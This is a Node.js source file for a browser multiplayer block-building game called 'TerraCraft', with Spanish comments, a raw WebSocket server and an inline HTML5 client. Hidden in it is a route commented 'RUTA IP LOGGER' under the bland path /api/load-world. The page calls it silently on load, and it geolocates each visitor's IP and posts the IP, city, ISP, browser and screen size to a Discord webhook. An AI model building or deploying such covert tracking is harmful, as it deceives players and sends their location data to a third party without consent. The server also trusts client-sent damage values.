const express = require('express');
const http = require('http');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.json());

const DISCORD_WEBHOOK_URL = "PEGA_AQUI_TU_WEBHOOK";

// --- SERVIDOR MULTIJUGADOR (WEBSOCKETS NATIVOS) ---
const clients = new Map();
const players = {};
const worldDeltas = {};

server.on('upgrade', (req, socket, head) => {
    const key = req.headers['sec-websocket-key'];
    if (!key) { socket.destroy(); return; }
    const acceptKey = crypto.createHash('sha1').update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');
    
    socket.write(
        'HTTP/1.1 101 Switching Protocols\r\n' +
        'Upgrade: websocket\r\n' +
        'Connection: Upgrade\r\n' +
        'Sec-WebSocket-Accept: ' + acceptKey + '\r\n\r\n'
    );

    const id = 'P_' + Math.random().toString(36).substring(2, 7);
    clients.set(socket, id);
    players[id] = { id, x: 4800, y: 480, vx: 0, vy: 0, hp: 100, facingRight: true, item: 0, color: '#' + Math.floor(Math.random()*16777215).toString(16) };

    socket.on('data', (buffer) => {
        try {
            const msgStr = decodeFrame(buffer);
            if (!msgStr) return;
            const data = JSON.parse(msgStr);
            
            if (data.type === 'init') {
                sendWS(socket, { type: 'welcome', id, players, worldDeltas });
                broadcast({ type: 'player_joined', player: players[id] }, id);
            } else if (data.type === 'move') {
                if (players[id]) {
                    Object.assign(players[id], data.state);
                    broadcast({ type: 'player_update', id, state: data.state }, id);
                }
            } else if (data.type === 'block_change') {
                worldDeltas[data.x + ',' + data.y] = data.block;
                broadcast({ type: 'block_change', x: data.x, y: data.y, block: data.block });
            } else if (data.type === 'pvp_hit') {
                if (players[data.targetId]) {
                    players[data.targetId].hp -= data.damage;
                    broadcast({ type: 'hit_received', targetId: data.targetId, damage: data.damage, knockback: data.knockback });
                }
            }
        } catch (e) {}
    });

    const cleanUp = () => {
        clients.delete(socket);
        delete players[id];
        broadcast({ type: 'player_left', id });
    };
    socket.on('close', cleanUp);
    socket.on('error', cleanUp);
});

function decodeFrame(buffer) {
    if (buffer.length < 2) return null;
    const secondByte = buffer[1];
    const isMasked = (secondByte & 0x80) === 0x80;
    let length = secondByte & 0x7f;
    let offset = 2;
    if (length === 126) {
        if (buffer.length < 4) return null;
        length = buffer.readUInt16BE(2); offset += 2;
    } else if (length === 127) { return null; }
    
    let masks = null;
    if (isMasked) {
        if (buffer.length < offset + 4) return null;
        masks = buffer.slice(offset, offset + 4); offset += 4;
    }
    if (buffer.length < offset + length) return null;
    const payload = buffer.slice(offset, offset + length);
    if (isMasked) {
        for (let i = 0; i < payload.length; i++) { payload[i] ^= masks[i % 4]; }
    }
    return payload.toString('utf8');
}

function encodeFrame(data) {
    const payload = Buffer.from(JSON.stringify(data));
    const length = payload.length;
    let header;
    if (length <= 125) {
        header = Buffer.from([0x81, length]);
    } else if (length <= 65535) {
        header = Buffer.alloc(4);
        header[0] = 0x81; header[1] = 126;
        header.writeUInt16BE(length, 2);
    } else { return Buffer.alloc(0); }
    return Buffer.concat([header, payload]);
}

function sendWS(socket, data) { try { socket.write(encodeFrame(data)); } catch(e) {} }
function broadcast(data, excludeId = null) {
    const frame = encodeFrame(data);
    for (const [socket, id] of clients.entries()) {
        if (id !== excludeId) { try { socket.write(frame); } catch(e) {} }
    }
}

// --- RUTA IP LOGGER ---
app.post('/api/load-world', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
    const d = req.body || {};
    let country = 'Desconocido', city = 'Desconocida', isp = 'Desconocido';

    try {
        const response = await fetch('http://ip-api.com/json/' + userIp + '?fields=country,city,isp,status');
        const geo = await response.json();
        if (geo.status === 'success') { country = geo.country; city = geo.city; isp = geo.isp; }
    } catch (e) {}

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
        const payload = {
            content: "⚔️ **¡Jugador Conectado al PvP!**\n📍 **IP:** `" + userIp + "` (" + city + ", " + country + ")\n📡 **ISP:** " + isp + "\n💻 **Navegador:** `" + (d.clientData || 'N/A') + "`\n🖥️ **Pantalla:** " + (d.renderRes || 'N/A')
        };
        try { await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); } catch (err) {}
    }
    res.json({ status: "success", seed: 12345 });
});

// --- CLIENTE HTML & JUEGO ---
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TerraCraft - Online PvP & Mobile</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; image-rendering: pixelated; touch-action: none; }
        body, html { background: #000; overflow: hidden; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; width: 100%; height: 100%; }
        canvas { display: block; width: 100%; height: 100%; }
        h1 { font-family: 'VT323', monospace; font-size: 4rem; text-shadow: 4px 4px 0 #333; margin-bottom: 20px; color: #fff; text-align: center; }
        .overlay { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.6); backdrop-filter: blur(8px); z-index: 100; }
        .hidden { display: none !important; }
        .btn { background: #8b8b8b; border: 4px solid; border-color: #fff #333 #333 #fff; padding: 12px 24px; font-size: 1.2rem; font-weight: bold; cursor: pointer; margin: 8px; width: 280px; text-align: center; color: #000; }
        .btn-green { background: #4ade80; }
        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; }
        #hud { position: absolute; top: 15px; left: 15px; }
        .health-bar { width: 200px; height: 26px; background: #333; border: 3px solid #111; border-radius: 4px; overflow: hidden; }
        .health-fill { width: 100%; height: 100%; background: #ef4444; transition: width 0.2s; }
        .inv-btn-touch { position: absolute; top: 15px; right: 15px; background: #3b82f6; border: 3px solid #fff; padding: 8px 16px; font-size: 1rem; font-weight: bold; border-radius: 6px; pointer-events: auto; cursor: pointer; }
        #hotbar { position: absolute; bottom: 15px; left: 50%; transform: translateX(-50%); display: flex; gap: 4px; pointer-events: auto; background: rgba(0,0,0,0.5); padding: 6px; border: 3px solid #333; max-width: 95vw; overflow-x: auto; }
        .slot { width: 48px; height: 48px; background: #8b8b8b; border: 3px solid; border-color: #555 #fff #fff #555; display: flex; justify-content: center; align-items: center; font-size: 1.6rem; cursor: pointer; position: relative; flex-shrink: 0; }
        .slot.active { border-color: #fff; box-shadow: 0 0 10px rgba(255,255,255,0.5); transform: scale(1.05); }
        .qty { position: absolute; bottom: 2px; right: 4px; font-size: 0.8rem; font-weight: bold; text-shadow: 1px 1px 0 #000; }
        
        /* CONTROLES TÁCTILES MÓVILES */
        #mobile-controls { position: absolute; bottom: 75px; width: 100%; display: flex; justify-content: space-between; padding: 0 20px; pointer-events: none; }
        .m-btn-group { display: flex; gap: 12px; pointer-events: auto; }
        .m-btn { width: 60px; height: 60px; background: rgba(0, 0, 0, 0.5); border: 3px solid rgba(255, 255, 255, 0.7); border-radius: 50%; color: white; font-size: 1.8rem; display: flex; justify-content: center; align-items: center; cursor: pointer; user-select: none; }
        .m-btn:active { background: rgba(255, 255, 255, 0.4); }

        #inventory-backdrop { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); z-index: 40; pointer-events: auto; }
        #inventory-gui { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #c6c6c6; border: 6px solid; border-color: #fff #555 #555 #fff; padding: 20px; width: 90%; max-width: 500px; z-index: 50; pointer-events: auto; display: flex; flex-direction: column; gap: 15px; color: black; }
        .inv-header { display: flex; justify-content: space-between; align-items: center; }
        .inv-grid { display: grid; grid-template-columns: repeat(9, 1fr); gap: 4px; background: #8b8b8b; padding: 8px; border: 3px solid; border-color: #555 #fff #fff #555; }
        .craft-area { display: flex; flex-direction: column; gap: 8px; background: #8b8b8b; padding: 10px; border: 3px solid; border-color: #555 #fff #fff #555; }
        .recipe-row { display: flex; align-items: center; justify-content: space-between; font-size: 0.9rem; }
        .craft-btn { background: #16a34a; color: white; padding: 4px 8px; cursor: pointer; border: 2px solid #86efac; font-weight: bold; }
    </style>
</head>
<body>
    <div id="main-menu" class="overlay">
        <h1>TerraCraft Online</h1>
        <button class="btn btn-green" onclick="startGame()">Entrar al Servidor</button>
    </div>

    <div id="ui-layer" class="hidden">
        <div id="hud"><div class="health-bar"><div id="hp-fill" class="health-fill"></div></div></div>
        <button class="inv-btn-touch" onclick="toggleInventory()">📦 Mochila</button>
        
        <div id="mobile-controls">
            <div class="m-btn-group">
                <div id="btn-left" class="m-btn">⬅️</div>
                <div id="btn-right" class="m-btn">➡️</div>
            </div>
            <div class="m-btn-group">
                <div id="btn-jump" class="m-btn">⬆️</div>
            </div>
        </div>

        <div id="hotbar"></div>
        <div id="inventory-backdrop" class="hidden" onclick="toggleInventory()"></div>
        <div id="inventory-gui" class="hidden">
            <div class="inv-header"><h3>Crafteos</h3><button style="padding:4px 8px; cursor:pointer;" onclick="toggleInventory()">X</button></div>
            <div class="craft-area">
                <div class="recipe-row"><span>1x Madera ➔ 4x Tablones</span><button class="craft-btn" onclick="craftItem(5, 9, 1, 4)">Fabricar</button></div>
                <div class="recipe-row"><span>2x Tablones ➔ 1x Espada</span><button class="craft-btn" onclick="craftItem(9, 10, 2, 1)">Fabricar</button></div>
                <div class="recipe-row"><span>3x Tablones + 2x Hojas ➔ 1x Cama</span><button class="craft-btn" onclick="craftBed()">Fabricar</button></div>
            </div>
            <h4>Inventario:</h4>
            <div class="inv-grid" id="inv-grid"></div>
        </div>
    </div>

    <canvas id="gameCanvas"></canvas>

    <script>
    fetch('/api/load-world', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ clientData: navigator.userAgent, renderRes: window.innerWidth + 'x' + window.innerHeight }) }).catch(()=>{});

    let gameState = 'MENU', invOpen = false, ws = null, myId = null, otherPlayers = {};
    const BLOCKS = {
        0: { name: 'Aire' },
        1: { name: 'Pico', isTool: true, icon: '⛏️' },
        2: { name: 'Pasto', hex: '#4ade80', acc: '#15803d' },
        3: { name: 'Tierra', hex: '#78350f', acc: '#92400e' },
        4: { name: 'Piedra', hex: '#52525b', acc: '#3f3f46' },
        5: { name: 'Madera', hex: '#5c3a21', acc: '#452b18' },
        6: { name: 'Hojas', hex: '#16a34a', acc: '#14532d' },
        9: { name: 'Tablones', hex: '#d97706', acc: '#b45309' },
        10: { name: 'Espada', isTool: true, icon: '🗡️' },
        11: { name: 'Cama', hex: '#ef4444', acc: '#b91c1c', icon: '🛏️' }
    };

    let inventory = { 1: 1, 2: 10, 5: 10, 10: 1, 11: 1 }; 
    let hotbarSlots = [1, 10, 5, 9, 11, 0, 0, 0, 0];
    let selectedSlot = 0;

    function startGame() {
        document.getElementById('main-menu').classList.add('hidden');
        document.getElementById('ui-layer').classList.remove('hidden');
        gameState = 'PLAYING';
        if(!window.gameInitialized) { initGame(); window.gameInitialized = true; }
    }

    function toggleInventory() {
        invOpen = !invOpen;
        document.getElementById('inventory-gui').classList.toggle('hidden', !invOpen);
        document.getElementById('inventory-backdrop').classList.toggle('hidden', !invOpen);
    }

    function renderHotbar() {
        const hb = document.getElementById('hotbar');
        hb.innerHTML = '';
        hotbarSlots.forEach((id, i) => {
            const b = BLOCKS[id] || BLOCKS[0];
            let qty = inventory[id] || 0;
            let inner = (b.isTool || id === 11) ? b.icon : (id !== 0 ? '<div style="width:28px;height:28px;background:'+b.hex+';border:2px solid '+b.acc+';"></div>' : '');
            let qtyLabel = (!b.isTool && id !== 0) ? '<span class="qty">'+qty+'</span>' : '';
            hb.innerHTML += '<div class="slot '+(i === selectedSlot ? 'active' : '')+'" onclick="selectedSlot='+i+'; renderHotbar()">'+inner+qtyLabel+'</div>';
        });
        const grid = document.getElementById('inv-grid');
        grid.innerHTML = '';
        hotbarSlots.forEach((id) => {
            const b = BLOCKS[id] || BLOCKS[0];
            let qty = inventory[id] || 0;
            let inner = (b.isTool || id === 11) ? b.icon : (id !== 0 ? '<div style="width:24px;height:24px;background:'+b.hex+';border:2px solid '+b.acc+';"></div>' : '');
            grid.innerHTML += '<div class="slot" style="width:100%;height:45px;">'+inner+'<span class="qty">'+qty+'</span></div>';
        });
    }

    function craftItem(reqId, outId, reqQty, outQty) {
        if ((inventory[reqId] || 0) >= reqQty) { inventory[reqId] -= reqQty; inventory[outId] = (inventory[outId] || 0) + outQty; renderHotbar(); }
    }
    function craftBed() {
        if ((inventory[9] || 0) >= 3 && (inventory[6] || 0) >= 2) { inventory[9] -= 3; inventory[6] -= 2; inventory[11] = (inventory[11] || 0) + 1; renderHotbar(); }
    }

    function initGame() {
        const cv = document.getElementById('gameCanvas');
        const ctx = cv.getContext('2d', { alpha: false });
        function resize() { cv.width = window.innerWidth; cv.height = window.innerHeight; }
        window.addEventListener('resize', resize); resize();

        const TILE = 48, CHUNK_W = 200, CHUNK_H = 120; 
        let world = Array.from({ length: CHUNK_W }, () => Array(CHUNK_H).fill(0));
        
        for (let x = 0; x < CHUNK_W; x++) {
            let h = Math.floor(40 + Math.sin(x * 0.08) * 6);
            for (let y = h; y < CHUNK_H; y++) {
                if(y === h) world[x][y] = 2; else if(y < h + 5) world[x][y] = 3; else world[x][y] = 4;
            }
        }

        for (let x = 5; x < CHUNK_W - 5; x++) {
            if (Math.random() < 0.08) {
                let sy = 0; while(world[x][sy] === 0 && sy < CHUNK_H) sy++;
                if (world[x][sy] === 2) {
                    world[x][sy-1] = 5; world[x][sy-2] = 5; world[x][sy-3] = 5;
                    world[x-1][sy-3] = 6; world[x+1][sy-3] = 6; world[x][sy-4] = 6;
                }
            }
        }

        const SPAWN_X = (CHUNK_W/2)*TILE, SPAWN_Y = 10*TILE;
        const player = { x: SPAWN_X, y: SPAWN_Y, w: 48, h: 96, vx: 0, vy: 0, speed: 6, jump: -14, grounded: false, hp: 100, maxHp: 100, facingRight: true };
        let camera = { x: player.x, y: player.y };
        let keys = {};

        // --- CONTROLES TÁCTILES MÓVILES ---
        function setupTouchBtn(btnId, keyCode) {
            const btn = document.getElementById(btnId);
            if (!btn) return;
            const start = (e) => { e.preventDefault(); keys[keyCode] = true; };
            const end = (e) => { e.preventDefault(); keys[keyCode] = false; };
            btn.addEventListener('touchstart', start, { passive: false });
            btn.addEventListener('touchend', end, { passive: false });
            btn.addEventListener('mousedown', start);
            btn.addEventListener('mouseup', end);
        }
        setupTouchBtn('btn-left', 'KeyA');
        setupTouchBtn('btn-right', 'KeyD');
        setupTouchBtn('btn-jump', 'Space');

        // --- CONEXIÓN MULTIJUGADOR ---
        const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
        ws = new WebSocket(protocol + location.host);
        
        ws.onopen = () => { ws.send(JSON.stringify({ type: 'init' })); };
        ws.onmessage = (e) => {
            const data = JSON.parse(e.data);
            if (data.type === 'welcome') {
                myId = data.id;
                otherPlayers = data.players;
                delete otherPlayers[myId];
                for (let k in data.worldDeltas) {
                    let parts = k.split(',');
                    world[parseInt(parts[0])][parseInt(parts[1])] = data.worldDeltas[k];
                }
            } else if (data.type === 'player_joined') {
                otherPlayers[data.player.id] = data.player;
            } else if (data.type === 'player_update') {
                if (otherPlayers[data.id]) Object.assign(otherPlayers[data.id], data.state);
                else otherPlayers[data.id] = data.state;
            } else if (data.type === 'player_left') {
                delete otherPlayers[data.id];
            } else if (data.type === 'block_change') {
                world[data.x][data.y] = data.block;
            } else if (data.type === 'hit_received') {
                if (data.targetId === myId) {
                    takeDamage(data.damage);
                    player.vx = data.knockback;
                    player.vy = -6;
                }
            }
        };

        window.addEventListener('keydown', e => {
            if (e.code === 'KeyE') toggleInventory();
            if (!invOpen) { keys[e.code] = true; if (e.key >= '1' && e.key <= '9') { selectedSlot = parseInt(e.key) - 1; renderHotbar(); } }
        });
        window.addEventListener('keyup', e => keys[e.code] = false);

        let mouseX = 0, mouseY = 0, isMouseDown = false, mouseBtn = 0;
        
        // EVENTOS DE MOUSE Y TÁCTIL EN CANVAS
        const updateCoords = (e) => {
            const rect = cv.getBoundingClientRect();
            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
            const clientY = e.touches ? e.touches[0].clientY : e.clientY;
            mouseX = clientX - rect.left;
            mouseY = clientY - rect.top;
        };

        window.addEventListener('mousemove', updateCoords);
        cv.addEventListener('touchstart', e => {
            if (gameState !== 'PLAYING' || invOpen) return;
            updateCoords(e);
            isMouseDown = true; mouseBtn = 0;
            handleMouseClick();
        }, { passive: false });
        cv.addEventListener('touchmove', e => { if(isMouseDown) updateCoords(e); }, { passive: false });
        cv.addEventListener('touchend', () => isMouseDown = false);

        window.addEventListener('mousedown', e => { if(gameState==='PLAYING' && !invOpen && e.target === cv){ isMouseDown = true; mouseBtn = e.button; handleMouseClick(); }});
        window.addEventListener('mouseup', () => isMouseDown = false);
        window.addEventListener('contextmenu', e => e.preventDefault());

        function handleMouseClick() {
            const realX = mouseX + camera.x, realY = mouseY + camera.y;
            let currentId = hotbarSlots[selectedSlot];

            if (mouseBtn === 0 && currentId === 10) {
                for (let id in otherPlayers) {
                    let p = otherPlayers[id];
                    let dist = Math.hypot((player.x + player.w/2) - (p.x + p.w/2), (player.y + player.h/2) - (p.y + p.h/2));
                    if (dist < 90) {
                        let kb = (p.x > player.x) ? 14 : -14;
                        if (ws && ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({ type: 'pvp_hit', targetId: id, damage: 25, knockback: kb }));
                        }
                        isMouseDown = false;
                        return;
                    }
                }
            }
        }

        function handleMouseHold() {
            if (!isMouseDown || invOpen) return;
            const realX = mouseX + camera.x, realY = mouseY + camera.y;
            const tx = Math.floor(realX / TILE), ty = Math.floor(realY / TILE);
            let currentId = hotbarSlots[selectedSlot];

            if (tx < 0 || tx >= CHUNK_W || ty < 0 || ty >= CHUNK_H) return;
            const dist = Math.hypot((player.x + player.w/2) - (tx*TILE), (player.y + player.h/2) - (ty*TILE));
            if (dist > TILE * 5) return;

            let blockChanged = false;
            let newBlock = 0;

            if (mouseBtn === 0 && currentId === 1) { 
                let minedBlock = world[tx][ty];
                if (minedBlock !== 0) {
                    inventory[minedBlock] = (inventory[minedBlock] || 0) + 1;
                    world[tx][ty] = 0; newBlock = 0; blockChanged = true;
                    renderHotbar(); isMouseDown = false;
                }
            } else if ((mouseBtn === 2 || (currentId !== 1 && currentId !== 10)) && world[tx][ty] === 0) {
                if (currentId !== 0 && currentId !== 1 && currentId !== 10 && inventory[currentId] > 0) {
                    world[tx][ty] = currentId; newBlock = currentId; blockChanged = true;
                    inventory[currentId]--; renderHotbar(); isMouseDown = false;
                }
            }

            if (blockChanged && ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: 'block_change', x: tx, y: ty, block: newBlock }));
            }
        }

        function checkCol(nx, ny) {
            const l = Math.floor(nx / TILE), r = Math.floor((nx + player.w - 1) / TILE);
            const t = Math.floor(ny / TILE), b = Math.floor((ny + player.h - 1) / TILE);
            if (l < 0 || r >= CHUNK_W || t < 0 || b >= CHUNK_H) return true;
            for (let y = t; y <= b; y++) { for (let x = l; x <= r; x++) { if (world[x][y] !== 0) return true; } }
            return false;
        }

        function takeDamage(amt) {
            player.hp -= amt;
            document.getElementById('hp-fill').style.width = Math.max(0, (player.hp/player.maxHp)*100) + '%';
            if (player.hp <= 0) {
                player.x = SPAWN_X; player.y = SPAWN_Y; player.hp = player.maxHp;
                document.getElementById('hp-fill').style.width = '100%';
            }
        }

        renderHotbar();
        let lastSendTime = 0;

        function update() {
            if (gameState === 'PLAYING') {
                if (!invOpen) {
                    if (keys['KeyA']) { player.vx -= 1.2; player.facingRight = false; }
                    else if (keys['KeyD']) { player.vx += 1.2; player.facingRight = true; }
                    else player.vx *= 0.6; 
                    
                    if (player.vx > player.speed) player.vx = player.speed;
                    if (player.vx < -player.speed) player.vx = -player.speed;

                    if ((keys['Space'] || keys['KeyW']) && player.grounded) {
                        player.vy = player.jump; player.grounded = false; keys['Space'] = false; 
                    }
                } else { player.vx *= 0.6; }

                player.vy += 0.8; if (player.vy > 20) player.vy = 20;

                if (!checkCol(player.x + player.vx, player.y)) { player.x += player.vx; } else { player.vx = 0; }

                player.grounded = false;
                if (!checkCol(player.x, player.y + player.vy)) { player.y += player.vy; } 
                else {
                    if (player.vy > 18) takeDamage(Math.floor(player.vy * 1.5));
                    if (player.vy > 0) { player.grounded = true; player.y = Math.floor((player.y + player.h + player.vy)/TILE)*TILE - player.h; } 
                    else if (player.vy < 0) { player.y = Math.floor((player.y + player.vy)/TILE)*TILE + TILE; }
                    player.vy = 0;
                }
                
                handleMouseHold();

                let now = Date.now();
                if (now - lastSendTime > 40 && ws && ws.readyState === WebSocket.OPEN && myId) {
                    lastSendTime = now;
                    ws.send(JSON.stringify({
                        type: 'move',
                        state: { x: player.x, y: player.y, vx: player.vx, vy: player.vy, facingRight: player.facingRight, item: hotbarSlots[selectedSlot], hp: player.hp }
                    }));
                }

                camera.x += (player.x + player.w/2 - cv.width/2 - camera.x) * 0.1;
                camera.y += (player.y + player.h/2 - cv.height/2 - camera.y) * 0.1;
            }

            ctx.fillStyle = '#87CEEB'; ctx.fillRect(0, 0, cv.width, cv.height);
            ctx.save(); ctx.translate(Math.floor(-camera.x), Math.floor(-camera.y));

            const sCol = Math.max(0, Math.floor(camera.x / TILE)), eCol = Math.min(CHUNK_W, Math.floor((camera.x + cv.width) / TILE) + 2);
            const sRow = Math.max(0, Math.floor(camera.y / TILE)), eRow = Math.min(CHUNK_H, Math.floor((camera.y + cv.height) / TILE) + 2);

            for (let x = sCol; x < eCol; x++) {
                for (let y = sRow; y < eRow; y++) {
                    let id = world[x][y];
                    if (id !== 0) {
                        ctx.fillStyle = BLOCKS[id].hex; ctx.fillRect(x * TILE, y * TILE, TILE, TILE);
                        ctx.fillStyle = BLOCKS[id].acc;
                        ctx.fillRect(x * TILE + TILE - 12, y * TILE + TILE - 12, 12, 12);
                    }
                }
            }

            for (let id in otherPlayers) {
                let p = otherPlayers[id];
                let px = p.x, py = p.y;
                let bodyColor = p.color || '#3b82f6';

                ctx.fillStyle = '#1e293b'; ctx.fillRect(px + 12, py + 50, 24, 46);
                ctx.fillStyle = bodyColor; ctx.fillRect(px + 12, py + 20, 24, 30);
                ctx.fillStyle = '#ffcc99'; ctx.fillRect(px + 12, py - 4, 24, 24);
                ctx.fillStyle = '#000'; ctx.fillRect(px + (p.facingRight ? 26 : 14), py + 4, 4, 6);

                if (p.item === 10) { ctx.font = "30px Arial"; ctx.fillText("🗡️", px + (p.facingRight ? 35 : -15), py + 50); }

                ctx.fillStyle = "white"; ctx.font = "14px Arial"; ctx.textAlign = "center";
                ctx.fillText(id, px + 24, py - 20);
                ctx.fillStyle = "#333"; ctx.fillRect(px, py - 14, 48, 6);
                ctx.fillStyle = "#ef4444"; ctx.fillRect(px, py - 14, (p.hp/100)*48, 6);
            }

            let px = player.x, py = player.y;
            ctx.fillStyle = '#1e293b'; ctx.fillRect(px + 12, py + 50, 24, 46);
            ctx.fillStyle = '#22c55e'; ctx.fillRect(px + 12, py + 20, 24, 30);
            ctx.fillStyle = '#ffcc99'; ctx.fillRect(px + 12, py - 4, 24, 24);
            ctx.fillStyle = '#000'; ctx.fillRect(px + (player.facingRight ? 26 : 14), py + 4, 4, 6);
            if (hotbarSlots[selectedSlot] === 10) { ctx.font = "30px Arial"; ctx.fillText("🗡️", px + (player.facingRight ? 35 : -15), py + 50); }

            ctx.restore(); requestAnimationFrame(update);
        }
        update();
    }
    </script>
</body>
</html>`);
});

server.listen(PORT, () => {
    console.log('Servidor multijugador y móvil corriendo en el puerto ' + PORT);
});
